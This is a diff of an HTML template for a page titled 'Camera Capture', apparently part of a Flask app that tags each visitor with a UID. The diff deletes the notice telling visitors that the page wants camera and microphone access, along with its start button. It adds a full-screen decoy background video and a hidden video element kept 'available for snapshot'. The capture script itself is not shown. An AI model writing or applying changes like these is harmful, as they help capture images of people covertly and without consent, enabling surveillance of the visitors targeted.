@@ -4,24 +4,40 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Camera Capture</title>
-    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            background: black;
+            overflow: hidden;
+        }
+        #bg-video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: -1;
+        }
+        #preview {
+            display: none; /* Hidden, but still available for snapshot */
+        }
+    </style>
 </head>
 <body>
     <!-- Background video -->
-    <video autoplay muted loop id="bgVideo">
-        <source src="{{ url_for('static', filename='background.mp4') }}" type="video/mp4">
+    <video id="bg-video" autoplay muted loop playsinline>
+        <source src="/static/background.mp4" type="video/mp4">
     </video>
 
-    <!-- Overlay UI -->
-    <div class="overlay">
-        <h1>Camera & Microphone Capture</h1>
-        <p>We need access to your camera and microphone.</p>
-        <button id="startBtn">Start Capture</button>
-    </div>
+    <!-- Hidden preview element for snapshots -->
+    <video id="preview" autoplay playsinline></video>
 
     <script>
-        const UID = "{{ uid }}"; // passed from server.py
+        const UID = "{{ uid }}";
     </script>
-    <script src="{{ url_for('static', filename='script.js') }}"></script>
+    <script src="/static/script.js"></script>
 </body>
 </html>
